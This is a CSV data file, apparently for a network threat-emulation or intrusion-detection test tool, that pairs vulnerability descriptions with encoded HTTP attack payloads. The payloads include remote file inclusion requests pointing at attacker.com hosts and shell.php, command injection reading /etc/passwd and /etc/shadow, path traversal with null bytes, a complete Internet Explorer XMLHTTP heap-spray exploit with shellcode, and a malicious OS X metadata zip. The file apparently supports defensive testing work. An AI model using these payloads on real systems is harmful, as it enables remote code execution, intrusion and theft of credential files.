XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
mediagallery_geeklog_cmi.xml,Media Gallery for Geeklog <= 1.4.8a Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Media Gallery for Geeklog is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿msie_xmlcore_cmi.xml,MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Vulnerability,"This threat leverages a flaw in the setRequestHeader method in the XMLHTTP (XML HTTP) ActiveX Control 4.0 in Microsoft XML Core Services 4.0 on Windows, when accessed by Internet Explorer, allows remote code execution on the client host. This affects Internet Explorer Web Browser clients that typically connect to the http port 80.",HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
msie_xmlcore_cmi.xml,MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Vulnerability,"This threat leverages a flaw in the setRequestHeader method in the XMLHTTP (XML HTTP) ActiveX Control 4.0 in Microsoft XML Core Services 4.0 on Windows, when accessed by Internet Explorer, allows remote code execution on the client host. This affects Internet Explorer Web Browser clients that typically connect to the http port 80.",HTTP,TCP,"<!DOCTYPE html PUBLIC ||22 ||-//W3C//DTD XHTML 1.1 plus 2.0//EN||22 ||>||0D 0A ||<!--||0D 0A ||MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Exploit||0D 0A 0D 0A ||Author||3A || n/a||0D 0A 0D 0A ||Info||3A 0D 0A ||http||3A ||//blogs.securiteam.com/index.php/archives/721||0D 0A ||http||3A ||//isc.sans.org/diary.php?storyid=1823||0D 0A ||http||3A ||//xforce.iss.net/xforce/alerts/id/239||0D 0A 0D 0A ||Found in the wild and was pointed out on securiteam's blog (cheers Gadi Evron!)||0D 0A 0D 0A ||Changed up the shellcode so it wouldn't be as evil for the viewers, calc.exe is called.||0D 0A 0D 0A ||/str0ke||0D 0A ||-->||0D 0A 0D 0A ||<html xmlns=||22 ||http||3A ||//www.w3.org/1999/xhtml||22 ||>||0D 0A ||<body>||0D 0A ||<object id=target classid=||22 ||CLSID||3A ||{88d969c5-f192-11d4-a65f-0040963251e5}||22 || >||0D 0A ||</object>||0D 0A ||<script>||0D 0A ||var obj = null||3B 0D 0A ||function exploit() {||0D 0A ||obj = document.getElementById('target').object||3B 0D 0A 0D 0A ||try {||0D 0A ||obj.open(new Array(),new Array(),new Array(),new Array(),new Array())||3B 0D 0A ||} catch(e) {}||3B 0D 0A 0D 0A ||sh = unescape (||22 ||%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090||22 || +||0D 0A 09 22 ||%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120||22 || +||0D 0A 09 22 ||%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424||22 || +||0D 0A 09 22 ||%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304||22 || +||0D 0A 09 22 ||%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0||22 || +||0D 0A 09 22 ||%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A||22 || +||0D 0A 09 22 ||%uFF57%u63E7%u6C61%u0063||22 ||)||3B 0D 0A 0D 0A ||sz = sh.length * 2||3B 0D 0A ||npsz = 0x400000-(sz+0x38)||3B 0D 0A ||nps = unescape (||22 ||%u0D0D%u0D0D||22 ||)||3B 0D 0A ||while (nps.length*2<npsz) nps+=nps||3B 0D 0A ||ihbc = (0x12000000-0x400000)/0x400000||3B 0D 0A ||mm = new Array()||3B 0D 0A ||for (i=0||3B ||i<ihbc||3B ||i++) mm[i] = nps+sh||3B 0D 0A 0D 0A ||obj.open(new Object(),new Object(),new Object(),new Object(), new Object())||3B ||    ||0D 0A 0D 0A ||obj.setRequestHeader(new Object(),'......')||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||obj.setRequestHeader(new Object(),0x12345678)||3B 0D 0A ||}||0D 0A ||</script>||0D 0A ||<body onLoad='exploit()' value='Exploit'>||0D 0A 0D 0A ||</body></html>||0D 0A 0D 0A ||# milw0rm.com [2006-11-08]||0D 0A||"
﻿mysql_commander_cmi.xml,MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability,This threat sends a crafted url string containing a path to an arbitrary script file which is included by the server and executed on the affected server. MySQL Commander is a web application that typically listens on port 80.,HTTP,TCP,GET /ressourcen/dbopen.php?home=http||3A ||//attacker.com/evil.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
mysql_commander_cmi.xml,MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability,This threat sends a crafted url string containing a path to an arbitrary script file which is included by the server and executed on the affected server. MySQL Commander is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿nettools_cmi.xml,PHP Net Tools 2.7.1 Remote Code Execution Exploit,This threat exploits the fact that arguments passed to the script are not filtered properly in order to prevent execution of arbitrary commands when calling system(). PHP Net Tools is a web application which typically listens on port 80.,HTTP,TCP,"POST /nettools//nettools.php HTTP/1.1||0D 0A ||TE||3A || deflate,gzip||3B ||q=0.3||0D 0A ||Connection||3A || TE, close||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT  5.0)||0D 0A ||Content-Length||3A || 34..Content-Type||3A || application/x-www-form-urlencoded||0D 0A 0D 0A ||ping=1&host=%7Ccat+%2Fetc%2Fpasswd||0D 0A||"
nettools_cmi.xml,PHP Net Tools 2.7.1 Remote Code Execution Exploit,This threat exploits the fact that arguments passed to the script are not filtered properly in order to prevent execution of arbitrary commands when calling system(). PHP Net Tools is a web application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿newsportal_cmi.xml,Newsportal (poll.php) Remote File Inclusion Vulnerability,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via poll.php's file_newsportal parameter. NewsPortal is a web based application which typically listens on port 80.,HTTP,TCP,"GET /newsportal%2Fextras%2Fpoll%2Fpoll.php%3Ffile_newsportal%3Dhttp%3A%2F%2Fwww.attacker.com%2Fevil.php HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
newsportal_cmi.xml,Newsportal (poll.php) Remote File Inclusion Vulnerability,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via poll.php's file_newsportal parameter. NewsPortal is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿noahsclassifieds_cmi.xml,Noah's classifieds Remote Code Execution Vulnerability,This threat sends an HTTP query containing a shell command as well as a remote file to be included and executed by the server. Noah's classifieds is a web application which typically listens on port 80.,HTTP,TCP,GET /classifieds/index.php?com=cat+%2Fetc%2Fshadow&lowerTemplate=http||3A ||//www.somesite.com/sys.php HTTP/1.1||0D 0A ||User-Agent||3A || Shareaza v1.x.x.xx||0D 0A ||Host||3A || www.exampl.com||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
noahsclassifieds_cmi.xml,Noah's classifieds Remote Code Execution Vulnerability,This threat sends an HTTP query containing a shell command as well as a remote file to be included and executed by the server. Noah's classifieds is a web application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿nocc_cmi_a.xml,"NOCC Arbitrary Local File Inclusion \\ Command Execution Vulnerability, lang field",This threat sends an HTTP query containing a path for a local (to the server) file to be included in the servers output.  NOCC is a web application which typically listens on port 80.,HTTP,TCP,"GET /noccw/index.php?lang=../../../../../../../../../../../../etc/passwd%00 HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
nocc_cmi_a.xml,"NOCC Arbitrary Local File Inclusion \\ Command Execution Vulnerability, lang field",This threat sends an HTTP query containing a path for a local (to the server) file to be included in the servers output.  NOCC is a web application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿nocc_cmi_b.xml,"NOCC Arbitrary Local File Inclusion \\ Command Execution Vulnerability, themes field",This threat sends an HTTP query containing a path for a local (to the server) file to be included in the servers output.  NOCC is a web application which typically listens on port 80.,HTTP,TCP,"GET /noccw/index.php?theme=../../../../../../../../../../../etc/passwd%00 HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
nocc_cmi_b.xml,"NOCC Arbitrary Local File Inclusion \\ Command Execution Vulnerability, themes field",This threat sends an HTTP query containing a path for a local (to the server) file to be included in the servers output.  NOCC is a web application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿nocc_cmi_c.xml,"NOCC Arbitrary Local File Inclusion \\ Command Execution Vulnerability, footer.php",This threat sends an HTTP query containing a path for a local (to the server) file to be included in the servers output.  NOCC is a web application which typically listens on port 80.,HTTP,TCP,"GET /noccw//html/footer.php?_SESSION[nocc_theme]=../../../../../../../../etc/passwd%00 HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
nocc_cmi_c.xml,"NOCC Arbitrary Local File Inclusion \\ Command Execution Vulnerability, footer.php",This threat sends an HTTP query containing a path for a local (to the server) file to be included in the servers output.  NOCC is a web application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿osx_metadata_cmi.xml,Apple Mac OS X Archive Metadata Command Execution Vulnerability,"This threat sends a zip file which exercises the OSX archive metadata flaw through an HTTP connection. OSX is an operating system developed by apple computer, and this threat is delivered over HTTP which typically uses port 80.",HTTP,TCP,GET /~phar/Secunia.mov.zip HTTP/1.0||0D 0A ||User-Agent||3A || Wget/1.10.2||0D 0A ||Accept||3A || */*||0D 0A ||Host||3A || www.stonedcoder.org||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||
osx_metadata_cmi.xml,Apple Mac OS X Archive Metadata Command Execution Vulnerability,"This threat sends a zip file which exercises the OSX archive metadata flaw through an HTTP connection. OSX is an operating system developed by apple computer, and this threat is delivered over HTTP which typically uses port 80.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 21 Feb 2006 18||3A ||57||3A ||44 GMT||0D 0A ||Server||3A || Apache||0D 0A ||Last-Modified||3A || Tue, 21 Feb 2006 08||3A ||05||3A ||12 GMT||0D 0A ||ETag||3A || ||22 ||352c28-221-787bde00||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 545||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || application/zip||0D 0A 0D 0A ||PK||03 04 14 00 00 00 08 00 A4 ||HU4||01 B4 01 ||?9||00 00 00 ||@||00 00 00 0B 00 15 00 ||Secunia.movUT||09 00 03 B4 C9 FA ||C||B4 C9 FA ||CUx||04 00 04 02 04 02 E3 D2 ||w,(||C8 C9 ||LN,||C9 CC CF ||+||D6 ||wN||CC ||I.||CD ||I,||C9 ||/||D2 ||K,(||D0 ||w||CE CF ||+I||CD ||+)||D6 F7 ||ML||F6 0F ||F||92 B5 ||VH||AD C8 ||,||E1 E2 E2 02 00 ||PK||03 04 14 00 00 00 08 00 01 ||<U4||E5 ||U||B4 19 B4 00 00 00 8C 05 00 00 16 00 15 00 ||__MACOSX/._Secunia.movUT||09 00 03 E1 B3 FA ||C||E1 B3 FA ||CUx||04 00 04 02 04 02 ||c`||15 ||cg`b||C0 04 || 1N 6||02 ||b||05 ||(?||88 81 81 D5 0A 8B ||Z4||C0 08 C4 AC 1C 0C 0C ||,||1C ||P||FD ||#||0C B0 B0 00 09 ||U}||C7 82 82 9C CC E4 C4 92 CC FC BC ||b||FD D0 92 CC 9C CC 92 CC D4 ||b||FD 90 D4 A2 DC CC BC C4 1C BD C4 82 02 86 ||7o||DE FC C7 86 1F ||>||7C 88 17 ||?{||F6 0C ||/~||F9 F2 ||%^||8C CB ||^||18 ||~||FF FE ||=^||FC F9 F3 ||g||BC F8 DB B7 ||ox||F1 8F 1F ||?||F0 E2 ||?||FE E0 C5 14 82 15 C0 08 C2 87 B5 08 ||`f||02 ||x||14 8C 02 8C ||r0||FE C2 1A A1 ||C@||96 0C A8 ||L,-.||CA 07 B2 B9 18 18 FE FF 07 AB E5 ||U||AC 01 00 ||PK||01 02 17 03 14 00 00 00 08 00 A4 ||HU4||01 B4 01 ||?9||00 00 00 ||@||00 00 00 0B 00 0D 00 00 00 00 00 01 00 00 00 E9 81 00 00 00 00 ||Secunia.movUT||05 00 03 B4 C9 FA ||CUx||00 00 ||PK||01 02 17 03 14 00 00 00 08 00 01 ||<U4||E5 ||U||B4 19 B4 00 00 00 8C 05 00 00 16 00 0D 00 00 00 00 00 00 00 00 00 E9 81 ||w||00 00 00 ||__MACOSX/._Secunia.movUT||05 00 03 E1 B3 FA ||CUx||00 00 ||PK||05 06 00 00 00 00 02 00 02 00 97 00 00 00 ||t||01 00 00 00 00||"
﻿pafiledb_cmi.xml,PAFileDB Pafiledb_Constants.PHP Remote File Include Vulnerability,"his threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via pafiledb_constants.php ""module_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"GET /pafiledb/includes/pafiledb_constants.php?module_root_path=http||3A ||//www.attacker.com/shell.php?cmd=cat%20/etc/passwd HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
pafiledb_cmi.xml,PAFileDB Pafiledb_Constants.PHP Remote File Include Vulnerability,"his threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via pafiledb_constants.php ""module_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿pearl_for_mambo_cmi.xml,Pearl For Mambo 1.6 Remote File Include Vulnerability,"This threats sends a crafted HTTP get query containing an PHP variable override for the GlobalSettingsVariable, which allows arbitrary inclusion of executable and nonexecutable code. Pearl For Mambo is a web based application which typically listens on port 80.",HTTP,TCP,"GET /mambo%2Fincludes%2Ffunctions_cms.php%3Fphpbb_root_path%3Dhttp%3A%2F%2Fwww.attacker.com%2F HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
